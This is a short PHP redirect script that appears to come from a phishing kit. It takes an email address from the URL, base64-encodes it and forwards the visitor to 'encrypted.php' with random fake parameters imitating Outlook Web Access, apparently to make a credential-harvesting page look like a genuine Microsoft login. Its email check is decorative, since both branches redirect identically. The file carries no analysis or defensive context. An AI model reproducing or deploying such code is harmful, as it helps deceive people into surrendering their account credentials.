<?php
session_start();

$varemail = $_GET['email'];
$share = base64_encode($varemail);
$x = mt_rand(100000000, 999999999);
$at=rand();
$cid=md5($at);

if (filter_var($varemail, FILTER_VALIDATE_EMAIL)) {
    header ("Location: encrypted.php?e=$at&at=9&CT=$x&OR=OWA-NT&CID=$cid&share=$share");
}
elseif (!filter_var($varemail, FILTER_VALIDATE_EMAIL)) {
    header ("Location: encrypted.php?e=$at&at=9&CT=$x&OR=OWA-NT&CID=$cid&share=$share");
}

?>